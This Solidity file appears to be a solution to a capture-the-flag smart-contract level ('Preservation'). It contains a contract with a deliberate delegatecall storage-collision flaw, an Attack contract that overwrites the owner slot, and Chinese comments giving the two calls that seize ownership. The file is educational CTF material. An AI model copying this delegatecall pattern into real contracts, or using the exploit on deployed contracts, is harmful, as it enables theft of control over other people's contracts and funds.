// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress; 
        timeZone2Library = _timeZone2LibraryAddress; 
        owner = msg.sender;
    }
   
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

contract LibraryContract {

    uint storedTime;  

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = msg.sender;
    }
}
// 通过 delegatecall 来调用另一个合约的函数并不会动用另一个合约的 storage，而是使用本地 storage，所以调用setTime函数更改storedTime会修改timeZone1Library
// await contract.setFirstTime("攻击合约")
// await contract.setFirstTime("0")


